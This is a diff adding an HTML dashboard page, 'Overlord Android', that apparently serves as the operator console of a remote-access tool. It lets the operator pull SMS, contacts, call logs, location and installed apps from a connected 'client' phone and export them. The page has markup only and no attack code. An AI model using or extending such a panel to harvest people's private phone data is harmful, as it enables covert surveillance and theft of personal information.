@@ -1,0 +1,301 @@
+<!doctype html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Overlord Android</title>
+    <link rel="stylesheet" href="/vendor/inter/400.css" />
+    <link rel="stylesheet" href="/vendor/inter/600.css" />
+    <link rel="stylesheet" href="/vendor/inter/700.css" />
+    <link rel="stylesheet" href="/assets/tailwind.css" />
+    <link rel="stylesheet" href="/vendor/fontawesome/css/all.min.css" />
+    <link rel="icon" type="image/x-icon" href="/assets/favicon.ico" />
+    <link rel="stylesheet" href="/assets/main.css" />
+    <link rel="stylesheet" href="/assets/custom.css" />
+    <style>
+      .section-card { transition: border-color 0.2s; }
+      .section-card:hover { border-color: rgb(71 85 105); }
+      .freshness-dot { transition: background-color 0.3s; }
+      .sort-btn { cursor: pointer; user-select: none; }
+      .sort-btn:hover { color: rgb(226 232 240); }
+      .pagination-btn:disabled { opacity: 0.4; cursor: not-allowed; }
+      @keyframes fadeIn { from { opacity: 0; transform: translateY(-4px); } to { opacity: 1; transform: translateY(0); } }
+      .fade-in { animation: fadeIn 0.2s ease-out; }
+      .section-content-collapsed { display: none; }
+      .stats-chip { @apply inline-flex items-center gap-1.5 rounded-lg px-3 py-1.5 text-xs font-medium bg-slate-800/80 text-slate-300 border border-slate-700/50; }
+    </style>
+  </head>
+  <body>
+    <header id="top-nav"></header>
+    <main class="max-w-7xl mx-auto px-4 py-6">
+      <!-- Header -->
+      <div class="mb-4">
+        <div class="flex items-center gap-3 mb-1">
+          <i class="fa-brands fa-android text-3xl text-green-400"></i>
+          <h1 class="text-2xl font-bold text-slate-100">Android Device</h1>
+        </div>
+        <div class="text-sm text-slate-400" id="client-label">Client: <span class="text-slate-300 font-mono">-</span></div>
+        <div id="conn-status" class="mt-2 flex items-center gap-3">
+          <span class="inline-flex items-center gap-1.5 rounded-full px-3 py-1 text-xs font-medium bg-slate-800 text-slate-400">
+            <span class="w-2 h-2 rounded-full bg-slate-500" id="status-dot"></span>
+            <span id="status-text">Loading...</span>
+          </span>
+        </div>
+      </div>
+
+      <!-- Top Stats Bar -->
+      <div id="stats-bar" class="hidden mb-4 flex flex-wrap gap-2 text-xs">
+        <span class="stats-chip" id="stat-model"><i class="fa-solid fa-mobile-screen"></i> <span>-</span></span>
+        <span class="stats-chip" id="stat-android"><i class="fa-solid fa-code-branch"></i> <span>-</span></span>
+        <span class="stats-chip" id="stat-battery"><i class="fa-solid fa-bolt"></i> <span>-</span></span>
+        <span class="stats-chip" id="stat-storage"><i class="fa-solid fa-database"></i> <span>-</span></span>
+        <span class="stats-chip" id="stat-uptime"><i class="fa-solid fa-clock"></i> <span>-</span></span>
+        <span class="stats-chip" id="stat-wifi"><i class="fa-solid fa-wifi"></i> <span>-</span></span>
+        <span class="stats-chip" id="stat-location"><i class="fa-solid fa-location-dot"></i> <span>-</span></span>
+      </div>
+
+      <!-- Error banner -->
+      <div id="error-banner" class="hidden mb-4 rounded-lg border border-red-800 bg-red-900/30 px-4 py-3 text-sm text-red-200">
+        <i class="fa-solid fa-circle-exclamation mr-2"></i>
+        <span id="error-text"></span>
+      </div>
+
+      <!-- Global Controls -->
+      <div class="mb-4 flex flex-wrap items-center gap-3">
+        <button id="refresh-all-btn" class="text-xs rounded-lg border border-slate-600 bg-slate-800 px-3 py-1.5 text-slate-300 hover:bg-slate-700">
+          <i class="fa-solid fa-rotate mr-1"></i>Refresh All
+        </button>
+        <div class="flex items-center gap-2 text-xs text-slate-400">
+          <i class="fa-solid fa-rotate-right"></i>
+          <span>Auto-refresh:</span>
+          <select id="auto-refresh-interval" class="rounded border border-slate-600 bg-slate-800 px-2 py-1 text-slate-300 text-xs">
+            <option value="0">Off</option>
+            <option value="15000">15s</option>
+            <option value="30000">30s</option>
+            <option value="60000">60s</option>
+          </select>
+        </div>
+        <span id="auto-refresh-indicator" class="hidden text-xs text-green-400"><i class="fa-solid fa-spinner fa-spin mr-1"></i>Auto-refreshing</span>
+      </div>
+
+      <!-- Feature Grid -->
+      <div class="grid grid-cols-1 lg:grid-cols-2 gap-4" id="sections-container">
+
+        <!-- Device Info -->
+        <div class="section-card rounded-xl border border-slate-700 bg-slate-900" data-section="device">
+          <div class="flex items-center justify-between p-4 pb-0 cursor-pointer toggle-section">
+            <h2 class="text-sm font-semibold text-slate-200 uppercase tracking-wider flex items-center gap-2">
+              <i class="fa-solid fa-info-circle text-green-400"></i> Device Info
+            </h2>
+            <div class="flex items-center gap-2">
+              <span class="freshness-dot w-2 h-2 rounded-full bg-slate-600" title="No data"></span>
+              <span class="text-xs text-slate-500 freshness-ts"></span>
+              <button class="fetch-btn text-xs rounded-lg border border-slate-600 bg-slate-800 px-3 py-1.5 text-slate-300 hover:bg-slate-700" data-type="device">
+                <i class="fa-solid fa-rotate mr-1"></i>Refresh
+              </button>
+              <i class="fa-solid fa-chevron-down text-slate-500 transition-transform toggle-icon"></i>
+            </div>
+          </div>
+          <div class="section-content p-4">
+            <div class="inline-loader hidden mb-2 text-xs text-slate-400"><i class="fa-solid fa-spinner fa-spin mr-1"></i>Loading...</div>
+            <div class="text-sm space-y-1.5" id="device-content">
+              <p class="text-slate-500 italic">Click Refresh to fetch device info.</p>
+            </div>
+          </div>
+        </div>
+
+        <!-- SMS -->
+        <div class="section-card rounded-xl border border-slate-700 bg-slate-900" data-section="sms">
+          <div class="flex items-center justify-between p-4 pb-0 cursor-pointer toggle-section">
+            <h2 class="text-sm font-semibold text-slate-200 uppercase tracking-wider flex items-center gap-2">
+              <i class="fa-solid fa-comment-dots text-emerald-400"></i> SMS
+              <span class="badge-count hidden text-xs rounded-full bg-slate-800 px-2 py-0.5 text-slate-400"></span>
+            </h2>
+            <div class="flex items-center gap-2">
+              <span class="freshness-dot w-2 h-2 rounded-full bg-slate-600" title="No data"></span>
+              <span class="text-xs text-slate-500 freshness-ts"></span>
+              <button class="fetch-btn text-xs rounded-lg border border-slate-600 bg-slate-800 px-3 py-1.5 text-slate-300 hover:bg-slate-700" data-type="sms">
+                <i class="fa-solid fa-rotate mr-1"></i>Refresh
+              </button>
+              <i class="fa-solid fa-chevron-down text-slate-500 transition-transform toggle-icon"></i>
+            </div>
+          </div>
+          <div class="section-content p-4">
+            <div class="inline-loader hidden mb-2 text-xs text-slate-400"><i class="fa-solid fa-spinner fa-spin mr-1"></i>Loading...</div>
+            <div class="flex flex-wrap items-center gap-2 mb-3">
+              <input class="section-search flex-1 min-w-[120px] rounded border border-slate-600 bg-slate-800 px-2 py-1 text-xs text-slate-200 placeholder-slate-500" data-section="sms" placeholder="Search SMS..." />
+              <span class="section-info text-xs text-slate-500"></span>
+            </div>
+            <div class="section-controls flex items-center gap-2 mb-2 text-xs">
+              <button class="export-btn text-slate-400 hover:text-slate-200" data-section="sms" data-format="json"><i class="fa-solid fa-download"></i> JSON</button>
+              <button class="export-btn text-slate-400 hover:text-slate-200" data-section="sms" data-format="csv"><i class="fa-solid fa-file-csv"></i> CSV</button>
+              <div class="flex-1"></div>
+              <button class="page-btn text-slate-400 hover:text-slate-200 disabled:opacity-40 disabled:cursor-not-allowed" data-section="sms" data-dir="prev"><i class="fa-solid fa-chevron-left"></i></button>
+              <span class="page-info text-slate-500"></span>
+              <button class="page-btn text-slate-400 hover:text-slate-200 disabled:opacity-40 disabled:cursor-not-allowed" data-section="sms" data-dir="next"><i class="fa-solid fa-chevron-right"></i></button>
+              <select class="page-size rounded border border-slate-600 bg-slate-800 px-1 py-0.5 text-slate-300 text-xs" data-section="sms">
+                <option value="25">25</option>
+                <option value="50" selected>50</option>
+                <option value="100">100</option>
+              </select>
+            </div>
+            <div class="text-sm max-h-80 overflow-y-auto" id="sms-content">
+              <p class="text-slate-500 italic">Click Refresh to fetch SMS messages.</p>
+            </div>
+          </div>
+        </div>
+
+        <!-- Contacts -->
+        <div class="section-card rounded-xl border border-slate-700 bg-slate-900" data-section="contacts">
+          <div class="flex items-center justify-between p-4 pb-0 cursor-pointer toggle-section">
+            <h2 class="text-sm font-semibold text-slate-200 uppercase tracking-wider flex items-center gap-2">
+              <i class="fa-solid fa-address-book text-blue-400"></i> Contacts
+              <span class="badge-count hidden text-xs rounded-full bg-slate-800 px-2 py-0.5 text-slate-400"></span>
+            </h2>
+            <div class="flex items-center gap-2">
+              <span class="freshness-dot w-2 h-2 rounded-full bg-slate-600" title="No data"></span>
+              <span class="text-xs text-slate-500 freshness-ts"></span>
+              <button class="fetch-btn text-xs rounded-lg border border-slate-600 bg-slate-800 px-3 py-1.5 text-slate-300 hover:bg-slate-700" data-type="contacts">
+                <i class="fa-solid fa-rotate mr-1"></i>Refresh
+              </button>
+              <i class="fa-solid fa-chevron-down text-slate-500 transition-transform toggle-icon"></i>
+            </div>
+          </div>
+          <div class="section-content p-4">
+            <div class="inline-loader hidden mb-2 text-xs text-slate-400"><i class="fa-solid fa-spinner fa-spin mr-1"></i>Loading...</div>
+            <div class="flex flex-wrap items-center gap-2 mb-3">
+              <input class="section-search flex-1 min-w-[120px] rounded border border-slate-600 bg-slate-800 px-2 py-1 text-xs text-slate-200 placeholder-slate-500" data-section="contacts" placeholder="Search contacts..." />
+              <span class="section-info text-xs text-slate-500"></span>
+            </div>
+            <div class="section-controls flex items-center gap-2 mb-2 text-xs">
+              <button class="export-btn text-slate-400 hover:text-slate-200" data-section="contacts" data-format="json"><i class="fa-solid fa-download"></i> JSON</button>
+              <button class="export-btn text-slate-400 hover:text-slate-200" data-section="contacts" data-format="csv"><i class="fa-solid fa-file-csv"></i> CSV</button>
+              <div class="flex-1"></div>
+              <button class="page-btn text-slate-400 hover:text-slate-200 disabled:opacity-40 disabled:cursor-not-allowed" data-section="contacts" data-dir="prev"><i class="fa-solid fa-chevron-left"></i></button>
+              <span class="page-info text-slate-500"></span>
+              <button class="page-btn text-slate-400 hover:text-slate-200 disabled:opacity-40 disabled:cursor-not-allowed" data-section="contacts" data-dir="next"><i class="fa-solid fa-chevron-right"></i></button>
+              <select class="page-size rounded border border-slate-600 bg-slate-800 px-1 py-0.5 text-slate-300 text-xs" data-section="contacts">
+                <option value="25">25</option>
+                <option value="50" selected>50</option>
+                <option value="100">100</option>
+              </select>
+            </div>
+            <div class="text-sm max-h-80 overflow-y-auto" id="contacts-content">
+              <p class="text-slate-500 italic">Click Refresh to fetch contacts.</p>
+            </div>
+          </div>
+        </div>
+
+        <!-- Call Log -->
+        <div class="section-card rounded-xl border border-slate-700 bg-slate-900" data-section="calllog">
+          <div class="flex items-center justify-between p-4 pb-0 cursor-pointer toggle-section">
+            <h2 class="text-sm font-semibold text-slate-200 uppercase tracking-wider flex items-center gap-2">
+              <i class="fa-solid fa-phone text-yellow-400"></i> Call Log
+              <span class="badge-count hidden text-xs rounded-full bg-slate-800 px-2 py-0.5 text-slate-400"></span>
+            </h2>
+            <div class="flex items-center gap-2">
+              <span class="freshness-dot w-2 h-2 rounded-full bg-slate-600" title="No data"></span>
+              <span class="text-xs text-slate-500 freshness-ts"></span>
+              <button class="fetch-btn text-xs rounded-lg border border-slate-600 bg-slate-800 px-3 py-1.5 text-slate-300 hover:bg-slate-700" data-type="calllog">
+                <i class="fa-solid fa-rotate mr-1"></i>Refresh
+              </button>
+              <i class="fa-solid fa-chevron-down text-slate-500 transition-transform toggle-icon"></i>
+            </div>
+          </div>
+          <div class="section-content p-4">
+            <div class="inline-loader hidden mb-2 text-xs text-slate-400"><i class="fa-solid fa-spinner fa-spin mr-1"></i>Loading...</div>
+            <div class="flex flex-wrap items-center gap-2 mb-3">
+              <input class="section-search flex-1 min-w-[120px] rounded border border-slate-600 bg-slate-800 px-2 py-1 text-xs text-slate-200 placeholder-slate-500" data-section="calllog" placeholder="Search call log..." />
+              <span class="section-info text-xs text-slate-500"></span>
+            </div>
+            <div class="section-controls flex items-center gap-2 mb-2 text-xs">
+              <button class="export-btn text-slate-400 hover:text-slate-200" data-section="calllog" data-format="json"><i class="fa-solid fa-download"></i> JSON</button>
+              <button class="export-btn text-slate-400 hover:text-slate-200" data-section="calllog" data-format="csv"><i class="fa-solid fa-file-csv"></i> CSV</button>
+              <div class="flex-1"></div>
+              <button class="page-btn text-slate-400 hover:text-slate-200 disabled:opacity-40 disabled:cursor-not-allowed" data-section="calllog" data-dir="prev"><i class="fa-solid fa-chevron-left"></i></button>
+              <span class="page-info text-slate-500"></span>
+              <button class="page-btn text-slate-400 hover:text-slate-200 disabled:opacity-40 disabled:cursor-not-allowed" data-section="calllog" data-dir="next"><i class="fa-solid fa-chevron-right"></i></button>
+              <select class="page-size rounded border border-slate-600 bg-slate-800 px-1 py-0.5 text-slate-300 text-xs" data-section="calllog">
+                <option value="25">25</option>
+                <option value="50" selected>50</option>
+                <option value="100">100</option>
+              </select>
+            </div>
+            <div class="text-sm max-h-80 overflow-y-auto" id="calllog-content">
+              <p class="text-slate-500 italic">Click Refresh to fetch call log.</p>
+            </div>
+          </div>
+        </div>
+
+        <!-- Location -->
+        <div class="section-card rounded-xl border border-slate-700 bg-slate-900" data-section="location">
+          <div class="flex items-center justify-between p-4 pb-0 cursor-pointer toggle-section">
+            <h2 class="text-sm font-semibold text-slate-200 uppercase tracking-wider flex items-center gap-2">
+              <i class="fa-solid fa-location-dot text-red-400"></i> Location
+            </h2>
+            <div class="flex items-center gap-2">
+              <span class="freshness-dot w-2 h-2 rounded-full bg-slate-600" title="No data"></span>
+              <span class="text-xs text-slate-500 freshness-ts"></span>
+              <button class="fetch-btn text-xs rounded-lg border border-slate-600 bg-slate-800 px-3 py-1.5 text-slate-300 hover:bg-slate-700" data-type="location">
+                <i class="fa-solid fa-rotate mr-1"></i>Refresh
+              </button>
+              <i class="fa-solid fa-chevron-down text-slate-500 transition-transform toggle-icon"></i>
+            </div>
+          </div>
+          <div class="section-content p-4">
+            <div class="inline-loader hidden mb-2 text-xs text-slate-400"><i class="fa-solid fa-spinner fa-spin mr-1"></i>Loading...</div>
+            <div class="text-sm" id="location-content">
+              <p class="text-slate-500 italic">Click Refresh to fetch location.</p>
+            </div>
+          </div>
+        </div>
+
+        <!-- Apps -->
+        <div class="section-card rounded-xl border border-slate-700 bg-slate-900" data-section="apps">
+          <div class="flex items-center justify-between p-4 pb-0 cursor-pointer toggle-section">
+            <h2 class="text-sm font-semibold text-slate-200 uppercase tracking-wider flex items-center gap-2">
+              <i class="fa-solid fa-grid-2 text-purple-400"></i> Installed Apps
+              <span class="badge-count hidden text-xs rounded-full bg-slate-800 px-2 py-0.5 text-slate-400"></span>
+            </h2>
+            <div class="flex items-center gap-2">
+              <span class="freshness-dot w-2 h-2 rounded-full bg-slate-600" title="No data"></span>
+              <span class="text-xs text-slate-500 freshness-ts"></span>
+              <button class="fetch-btn text-xs rounded-lg border border-slate-600 bg-slate-800 px-3 py-1.5 text-slate-300 hover:bg-slate-700" data-type="apps">
+                <i class="fa-solid fa-rotate mr-1"></i>Refresh
+              </button>
+              <i class="fa-solid fa-chevron-down text-slate-500 transition-transform toggle-icon"></i>
+            </div>
+          </div>
+          <div class="section-content p-4">
+            <div class="inline-loader hidden mb-2 text-xs text-slate-400"><i class="fa-solid fa-spinner fa-spin mr-1"></i>Loading...</div>
+            <div class="flex flex-wrap items-center gap-2 mb-3">
+              <input class="section-search flex-1 min-w-[120px] rounded border border-slate-600 bg-slate-800 px-2 py-1 text-xs text-slate-200 placeholder-slate-500" data-section="apps" placeholder="Search apps..." />
+              <span class="section-info text-xs text-slate-500"></span>
+            </div>
+            <div class="section-controls flex items-center gap-2 mb-2 text-xs">
+              <button class="export-btn text-slate-400 hover:text-slate-200" data-section="apps" data-format="json"><i class="fa-solid fa-download"></i> JSON</button>
+              <button class="export-btn text-slate-400 hover:text-slate-200" data-section="apps" data-format="csv"><i class="fa-solid fa-file-csv"></i> CSV</button>
+              <div class="flex-1"></div>
+              <button class="page-btn text-slate-400 hover:text-slate-200 disabled:opacity-40 disabled:cursor-not-allowed" data-section="apps" data-dir="prev"><i class="fa-solid fa-chevron-left"></i></button>
+              <span class="page-info text-slate-500"></span>
+              <button class="page-btn text-slate-400 hover:text-slate-200 disabled:opacity-40 disabled:cursor-not-allowed" data-section="apps" data-dir="next"><i class="fa-solid fa-chevron-right"></i></button>
+              <select class="page-size rounded border border-slate-600 bg-slate-800 px-1 py-0.5 text-slate-300 text-xs" data-section="apps">
+                <option value="50">50</option>
+                <option value="100" selected>100</option>
+                <option value="200">200</option>
+              </select>
+            </div>
+            <div class="text-sm max-h-80 overflow-y-auto" id="apps-content">
+              <p class="text-slate-500 italic">Click Refresh to fetch app list.</p>
+            </div>
+          </div>
+        </div>
+
+      </div>
+    </main>
+
+    <script defer src="/vendor/msgpackr/msgpackr.js"></script>
+    <script type="module" src="/assets/nav.js"></script>
+    <script type="module" src="/assets/android.js"></script>
+  </body>
+</html>
